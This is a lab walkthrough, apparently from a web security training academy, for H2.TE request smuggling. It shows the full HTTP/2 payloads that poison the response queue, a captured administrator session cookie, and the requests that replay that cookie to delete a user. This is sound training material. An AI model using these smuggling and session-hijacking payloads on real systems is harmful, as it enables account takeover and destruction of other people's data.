## Response queue poisoning via H2.TE request smuggling

This lab is vulnerable to **H2.TE request smuggling** because the front-end downgrades HTTP/2 requests while incorrectly handling `Transfer-Encoding: chunked`.

The objective is to perform **response queue poisoning**, capture an administrator's authenticated response, steal the administrator's session cookie, access `/admin`, and delete the user `carlos`.

## Notes

- Possibility to leave a comment
- Search page
- `/admin`
- `/login`

## Resume

1. Confirm H2.TE request smuggling
2. Poison the response queue
3. Capture an administrator response
4. Steal the administrator session cookie
5. Access `/admin`
6. Delete `carlos`

## Solve

Confirm H2.TE request smuggling:

```http
POST / HTTP/2
Host: 0a0c00d6037eae9380967151002c0006.web-security-academy.net
Transfer-Encoding: chunked

0

SMUGGLED
```

Every second request returns a different response (typically a `404`), confirming that the back-end interprets the body as a smuggled prefix and appends subsequent requests to it.

Create a complete smuggled request that always generates a `404` response:

```http
POST /x HTTP/2
Host: 0a0c00d6037eae9380967151002c0006.web-security-academy.net
Transfer-Encoding: chunked

0

GET /x HTTP/1.1
Host: 0a0c00d6037eae9380967151002c0006.web-security-academy.net

```

> Important: the smuggled request must end with `\r\n\r\n` after the `Host` header.

Send the request once to poison the response queue.

The first response is your own expected `404 Not Found`.

Wait a few seconds for an administrator request to be processed on the shared back-end connection, then resend the exact same payload.

Most attempts return your own queued `404` response:

```http
HTTP/2 404 Not Found
```

Eventually, instead of receiving your own response, you capture a response intended for the administrator:

```http
HTTP/2 302 Found
Location: /my-account?id=administrator
Set-Cookie: session=KIBagAUQWRcmVI90tI3Gl4D7r8KATx8u; Secure; HttpOnly; SameSite=None
X-Frame-Options: SAMEORIGIN
Content-Length: 0
```

Administrator session obtained:

```http
session=KIBagAUQWRcmVI90tI3Gl4D7r8KATx8u
```

Use the stolen session to access the admin panel:

```http
GET /admin HTTP/2
Host: 0a0c00d6037eae9380967151002c0006.web-security-academy.net
Cookie: session=KIBagAUQWRcmVI90tI3Gl4D7r8KATx8u
```

Because responses can occasionally become desynchronized, send the request multiple times until the admin panel is returned:

```http
HTTP/2 200 OK
```

The admin panel exposes a delete endpoint similar to:

```http
/admin/delete?username=carlos
```

Use the stolen administrator session to delete the target user:

```http
GET /admin/delete?username=carlos HTTP/2
Host: 0a0c00d6037eae9380967151002c0006.web-security-academy.net
Cookie: session=KIBagAUQWRcmVI90tI3Gl4D7r8KATx8u
```

Response:

```http
HTTP/2 302 Found
```

The user `carlos` is deleted and the lab is solved.
